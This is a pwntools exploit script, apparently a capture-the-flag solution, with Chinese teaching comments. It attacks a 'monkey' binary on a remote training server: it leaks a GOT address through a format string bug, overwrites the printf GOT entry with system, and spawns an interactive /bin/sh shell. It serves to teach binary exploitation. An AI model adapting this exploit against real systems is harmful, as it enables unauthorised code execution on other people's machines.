from pwn import *

context.arch = 'i386'
local = False
debug = False
gdb1 = False
if debug == True:
    context.log_level = "debug"
if local:
    cn = process('./monkey')
    bin = ELF('./monkey')
    if gdb1 == True:
        gdb.attach(cn)

else:
    cn = remote('bamboofox.cs.nctu.edu.tw', 11000)


def program(Text):
    cn.recvuntil("choice!\n")
    cn.sendline("2")
    cn.recvuntil("out.\n")
    cn.sendline(Text)


"""concept
`program(b"\x61\x61\x61\x61%9$s" + p32(0x804a028))` 的目的是通過格式化字符串漏洞從程式中泄露 `system` 函數的位址。

在這行程式碼中，`b"\x61\x61\x61\x61%9$s"` 是一個格式化字符串，其中 `%9$s` 表示要顯示位於索引 9 的格式化字符串引數。而 `p32(0x804a028)` 則是將 `0x804a028` 的位址轉換為 32 位元的小端字節序。

當這個格式化字符串作為輸入參數傳遞給 `program` 函數時，程式會將這個格式化字符串打印到輸出中，並顯示位於索引 9 的格式化字符串引數的值。由於 `%9$s` 指示符的存在，程式將從堆疊上讀取該引數的值並顯示。

在這種情況下，索引 9 的格式化字符串引數被設置為位址 `0x804a028`，因此程式會從該位址讀取內容並將其顯示出來。這就是為什麼這行程式碼能夠取得 `system` 函數的位址。

在 object file 中，地址 `0x804a028` 可能是對於 `system` 函數的一個符號（symbol）的地址，而不是 `system` 函數本身的地址。這是因為在編譯和連結過程中，程式中的符號和函數被解析並分配了實際的記憶體位址。因此，在執行時，需要通過讀取符號的值或在連結時解析 GOT（Global Offset Table）中的地址，才能獲取實際的函數位址。

這就是為什麼在程式中需要進行額外的步驟，通過泄露符號的地址或通過格式化字符串漏洞從堆疊上讀取 GOT 中的地址，來獲取實際的函數位址。
"""

# 取得 system 的實際跳轉地址(0x804a028 僅為 symbol 地址)
# 讀取 symbol 取得 mapping 後的實際地址
program(b"\x61\x61\x61\x61%9$s" + p32(0x804a028))
words = cn.recvuntil("\n")
# 每次的 symbol mapping 會不同
system_got_plt = int.from_bytes(words[4:8], byteorder="little")
# 把 print 的跳轉地址改成 system 的跳轉地址(為長地址所以要用除擺前面, 用%放後面)
program(p32(0x804a00c)+p32(0x804a00e)+b"%"+str((system_got_plt % 65536)-8).encode("utf-8") +
        b"c%7$n%"+str((system_got_plt/65536)-(system_got_plt % 65536)).encode("utf-8")+b"c%8$n")
# 使執行 print 變成執行 system
program("/bin/sh")
cn.interactive()
